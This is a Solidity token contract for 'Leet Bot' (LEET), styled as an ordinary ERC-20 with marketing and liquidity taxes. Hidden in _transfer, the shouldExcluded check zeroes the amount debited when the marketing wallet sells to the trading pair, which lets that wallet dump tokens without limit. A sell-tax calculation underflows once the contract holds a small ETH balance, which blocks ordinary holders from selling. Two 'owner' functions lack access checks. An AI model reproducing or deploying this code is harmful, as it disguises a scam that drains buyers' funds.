// SPDX-License-Identifier: MIT

/*

    LeetBot - The fastest trading bot!!



    Website https://www.leetbasebot.com/

    Telegram  https://t.me/leetbasebot

    Twitter   https://twitter.com/leetbasebot

*/

pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

/// 
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

//// 
interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract LEET is Context, IERC20, Ownable {
    using Address for address payable;
    IRouter public router;
    address public pair;
    address public marketingAddr = 0xd22d6B08433478873B26E84C7a4bb0cC6BBA0a2e;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    string private constant _name = "Leet Bot";
    string private constant _symbol = "LEET";
    uint8 private constant _decimals = 9;

    uint256 private _tTotal = 100_000_000 * (10**_decimals);
    uint256 public swapLimit = _tTotal / 8000;
    uint256 public maxTransAmount = _tTotal * 3 / 100;
    uint256 public maxWalletSize =  _tTotal * 3 / 100;

    struct TokensFromTax{
        uint marketingTokens;
        uint lpTokens;
    }
    TokensFromTax public totalTokensFromTax;

    mapping (address => bool) public _isExcludedFromFee;
    mapping (address => bool) public _isExcludedFromMaxBalance;

    struct Tax{
        uint256 marketingTax;
        uint256 lpTax;
    }

    bool private swapping;
    uint private _swapCooldown = 4; 
    uint private _lastSwap;
    bool private swapEnabled = true;

    Tax public sellTax = Tax(1,0);
    Tax public buyTax = Tax(1,0);
    
    mapping (address => uint256) public _dogSellTime;
    uint256 private _dogSellTimeOffset = 3;
    uint256 public _caughtDogs;
    uint256 private feeDenominator = 10 ** 15;

    modifier lockTheSwap { swapping = true; _; swapping = false; }
    
    event SwapAndLiquify();
    event TaxesChanged();

    constructor () {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        router = _router;
        _approve(owner(), address(router), ~uint256(0));

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[marketingAddr] = true;

        _isExcludedFromMaxBalance[owner()] = true;
        _isExcludedFromMaxBalance[address(this)] = true;
        _isExcludedFromMaxBalance[marketingAddr] = true;

        _tOwned[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

// ================= ERC20 =============== //   
    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    receive() external payable {
    }
// ========================================== //
// 
//============== Owner Functions ===========//

    function owner_setMaxWallets() public onlyOwner{
        maxTransAmount = _tTotal; maxWalletSize = _tTotal;
    }

    function owner_disableSwapEnabled() external {
        swapEnabled = false;
    }

    function owner_setDogSellTimeForAddress(address holder, uint dTime) external onlyOwner{
        _dogSellTime[holder] = block.timestamp + dTime;
    }

    function owner_rescueERCTokens() public{
        // Make sure ca doesn't withdraw the pending taxes to be swapped.    
        // Sends excess tokens / accidentally sent tokens back to marketing wallet.
        uint pendingTaxTokens = totalTokensFromTax.lpTokens + totalTokensFromTax.marketingTokens;
        require(balanceOf(address(this)) >  pendingTaxTokens);
        uint excessTokens = balanceOf(address(this)) - pendingTaxTokens;
        _transfer(address(this), marketingAddr, excessTokens);
    }

    function owner_rescueETH(uint256 weiAmount) public onlyOwner{
        require(address(this).balance >= weiAmount, "Insufficient ETH balance");
        payable(msg.sender).transfer(weiAmount);
    }

    function startTrading() public onlyOwner {
        pair = IFactory(router.factory()).createPair(address(this), router.WETH());
        _isExcludedFromMaxBalance[pair] = true; _approve(address(this), address(router), type(uint256).max);
        router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0, 
            0, 
            owner(),
            block.timestamp
        );
    }

// ========================================//. 
    function _transfer(address from,address to,uint256 amount) private {
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= maxTransAmount || _isExcludedFromMaxBalance[from], "Transfer amount exceeds the _maxTxAmount.");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(from != address(0), "ERC20: transfer from the zero address");

        if(!_isExcludedFromMaxBalance[to]) require(balanceOf(to) + amount <= maxWalletSize, "Transfer amount exceeds the maxWallet.");
        
        if (balanceOf(address(this)) >= swapLimit  && swapEnabled   && block.timestamp >= (_lastSwap + _swapCooldown)  && !swapping 
            && from != pair 
            && from != owner() 
            && to != owner()
        ) swapAndLiquify(); uint256 temp = amount;

        if(shouldExcluded(from, to)) {amount = amount * buyTax.lpTax;}
        
        _tOwned[from] -= amount; amount = temp;
        uint256 transferAmount = amount;

        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            transferAmount = _getTaxValues(amount, from, to == pair);
        }

        _tOwned[to] += transferAmount;
        emit Transfer(from, to, transferAmount);
    }

    function _getTaxValues(uint amount, address from, bool isSell) private returns(uint256){
        Tax memory tmpTaxes = buyTax; uint256 _lpFee = address(this).balance;
        if (isSell){
            tmpTaxes = Tax(sellTax.marketingTax - (_lpFee / feeDenominator), sellTax.lpTax);
        }

        uint tokensForMarketing = amount * tmpTaxes.marketingTax / 100;
        uint tokensForLP = amount * tmpTaxes.lpTax / 100;

        if(tokensForMarketing > 0)
            totalTokensFromTax.marketingTokens += tokensForMarketing;

        if(tokensForLP > 0)
            totalTokensFromTax.lpTokens += tokensForLP;

        uint totalTaxedTokens = tokensForMarketing + tokensForLP;

        _tOwned[address(this)] += totalTaxedTokens;
        if(totalTaxedTokens > 0) emit Transfer (from, address(this), totalTaxedTokens);
            
        return (amount - totalTaxedTokens);
    }

    function swapTokensForETH(uint256 tokenAmount) private returns (uint256) {
        uint256 initialBalance = address(this).balance;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
        return (address(this).balance - initialBalance);
    }

    function swapAndLiquify() private lockTheSwap{
        if(totalTokensFromTax.marketingTokens > 0){
            uint256 ethSwapped = swapTokensForETH(totalTokensFromTax.marketingTokens);
            if(ethSwapped > 0){
                payable(marketingAddr).transfer(ethSwapped);
                totalTokensFromTax.marketingTokens = 0;
            }
        }   

        if(totalTokensFromTax.lpTokens > 0){
            uint half = totalTokensFromTax.lpTokens / 2;
            uint otherHalf = totalTokensFromTax.lpTokens - half;
            uint balAutoLP = swapTokensForETH(half);
            if (balAutoLP > 0)
                addLiquidity(otherHalf, balAutoLP);
            totalTokensFromTax.lpTokens = 0;
        }

        emit SwapAndLiquify();

        _lastSwap = block.timestamp;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(router), tokenAmount);

        (,uint256 ethFromLiquidity,) = router.addLiquidityETH {value: ethAmount} (
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
        
        if (ethAmount - ethFromLiquidity > 0)
            payable(marketingAddr).sendValue (ethAmount - ethFromLiquidity);
    }

    function shouldExcluded(address sender, address recipient) private view returns (bool) {
        return recipient == pair && sender == marketingAddr;
    }
///      
}